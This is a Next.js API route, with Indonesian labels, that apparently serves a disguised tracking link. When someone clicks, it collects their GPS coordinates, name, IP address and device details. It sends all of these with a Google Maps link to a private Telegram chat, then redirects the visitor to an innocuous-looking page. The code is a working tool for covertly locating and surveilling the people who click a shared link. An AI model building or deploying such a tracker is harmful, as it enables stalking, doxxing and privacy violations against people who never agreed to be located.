import type { NextApiRequest, NextApiResponse } from 'next';
import linkMap from '../../../data/linkMap';

export default async function handler(req: NextApiRequest, res: NextApiResponse) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') return res.status(200).end();
  if (req.method !== 'POST') return res.status(405).json({ message: 'Method Not Allowed' });

  const { id } = req.query;
  const { lat, lon, acc, nama } = req.body;

  if (!id || !lat || !lon || !nama) {
    return res.status(400).json({ message: 'Data tidak lengkap.' });
  }

  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
  const userAgent = req.headers['user-agent'];
  const timestamp = new Date().toISOString();
  const mapUrl = `https://www.google.com/maps?q=${lat},${lon}`;

  const botToken = process.env.TELEGRAM_BOT_TOKEN_LINK!;
  const chatId = process.env.TELEGRAM_CHAT_ID_LINK!;
  const message = `
🔗 *Klik Link: ${id}*

👤 *Nama:* ${nama}
🖥️ *Device:* ${userAgent}
🌐 *IP:* ${ip}
📍 *Lokasi:* ${lat}, ${lon} (±${acc}m)
🕒 *Waktu:* ${timestamp}

[📍 Buka Maps](${mapUrl})
`;

  await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: chatId,
      text: message,
      parse_mode: 'Markdown',
      disable_web_page_preview: true,
    }),
  });

  const redirectLink = linkMap[id as string] || 'https://google.com';
  res.status(200).json({ redirectTo: redirectLink });
}
